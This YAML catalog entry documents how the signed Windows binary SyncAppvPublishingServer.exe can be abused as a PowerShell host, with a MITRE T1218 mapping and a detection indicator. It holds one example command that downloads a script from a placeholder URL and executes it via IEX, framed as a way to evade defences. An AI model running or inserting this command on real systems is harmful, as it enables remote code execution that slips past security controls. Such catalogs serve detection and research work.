---
name: SyncAppvPublishingServer.exe
description: Used by App-v to get App-v server lists
functions:
  execute:
    - description: Example command on how inject Powershell code into the process
      code: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
resources:
    - resource: https://twitter.com/monoxgas/status/895045566090010624
fullpath:
    - path: C:\Windows\System32\SyncAppvPublishingServer.exe
    - path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
detection:
  - IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
acknowledgement:
  - Person: Nick Landers
    Handle: '@monoxgas'
---
